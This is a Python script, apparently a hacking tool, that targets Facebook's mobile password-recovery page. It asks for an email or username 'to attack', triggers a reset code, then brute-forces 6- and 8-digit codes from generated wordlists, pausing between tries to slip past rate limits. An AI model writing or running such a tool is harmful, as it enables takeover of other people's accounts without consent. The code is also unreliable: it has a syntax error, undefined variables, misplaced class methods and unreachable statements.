import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def passcode6():
  try:
    f = open("6digits.txt", "a")
    f.close()
  except:
    f = open("6digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=6):
        f.write(''.join(map(str, combination)))
  try:
    z = open("8digits.txt", "a")
    z.close()
  except:
    z = open("8digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=8):
      z.write(''.join(map(str, combination)))

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9
      code = ("0", str(z))
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex):
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
  try:
    browser.select_form(nr=0)
  except:
    with open("emails.txt", "a") as f:
        f.write(str(email))
        f.close()
    with open("passcoder.txt", "a") as z:
        z.write(str(reset1))
        z.close()
    with open("passcoder.txt", "r") as z:
      reset = z.readlines(-1)
      z.close()
    y = reset
    raise
  browser.form['email'] = email
  browser.submit()
  """selection confirmation"""
  try:
    browser.select_form(nr=0)
  except:
    with open("emails.txt", "a") as f:
        f.write(str(email))
        f.close()
    with open("passcoder.txt", "a") as z:
        z.write(str(reset1))
        z.close()
    with open("passcoder.txt", "r") as z:
      reset = z.readlines(-1)
      z.close()
    y = reset
    raise
  browser.submit()
  browser.select_form(nr=0)
  browser.submit()
  browser.select_form(nr=0)
  browser.submit()
  """reset code input"""
  y = int(codex)
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  test = soup.find(string="poop")
  check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
  check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  if check1 != test:
    attempt = int(codex)
    print(check1)
    f = open("6digits.txt", "r")
    attempt = int(codex)
    while check1 != test:
      browser.select_form(nr=0)
      y = f.readlines(attempt)
      attempt += 1
      browser.form['n'] = y
      browser.submit()
      print(y, end='\r')
      fail = (y, "failed")
      success = (y, "succeded")
      s = " "
      with open("passcoder.txt", "a+") as z:
        f.write(str(attempt))
        f.close()
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
      if check1 == check3:
        print(s.join(fail))
        count = 30
        sleepy(count)
      else:
        soup = BeautifulSoup(response1, 'html.parser')
        if soup.find(string="password_new") == test:
          print("Password not found")
          print(browser.geturl())
          browser.close()
        else:
          print(s.join(success))
  elif check2 != test:
    print(check2)
    attempt = int(codex)
    f = open("8digits.txt", "r")
    while check2 != check4:
      browser.select_form(nr=0)
      y = f.readlines(attempt)
      attempt += 1
      browser.form['n'] = y
      browser.submit()
      print(str(y), end='\r')
      fail = (y, "failed")
      success = (y, "succeded")
      s = " "
      reset -= 1
      reset1 = reset
      with open("passcoder.txt", "a") as z:
        z.write(str(reset1))
        z.close()
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
      if check2 != test:
        print(s.join(fail))
        count = 30
        sleepy(count)
      else:
        soup = BeautifulSoup(response1, 'html.parser')
        if soup.find(string="password_new") == test:
          print("Password not found")
          print(browser.geturl())
          print(browser.response())
          browser.close()
        else:
          print(s.join(success))
  else:
    with open("passcoder.txt", "r") as z:
      reset = z.readlines(-1)
      z.close()
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    print(browser.geturl())
    print(response1)
    if soup.find(string="password_new") == test:
      print("Passcode not found")
    elif soup.find(string="password_new") != test:
      print("Passcode found!")
      print(y)
      browser.close()
      reset = int(-1)
  return reset, y, browser

os.system('clear')
passcode6()
f = open("emails.txt", "r")
ehack = input('Email address or username to attack:') or f.readlines(-1)
f.close()
reset = int(input('Code: ') or 99999999)
reset1 = reset
f = open("emails.txt", "a")
z = open("passcoder.txt", "a")
f.write(ehack)
f.close()
z.write(str(reset1))
z.close()

while True:
  try:
    fb_hack(ehack, reset)
    reset = reset1
    if int(reset) < int(0):
      break
    else:
      reset1 = reset
  except:
    sys.exit()
    with open(emails.txt, "r") as f:
      ehack = f.readlines(-1)
      f.close()
    with open(passcoder.txt, "r") as f:
      reset = int(z.readlines(-1))
      z.close()
    print("Restarting")
    sleepy(30)
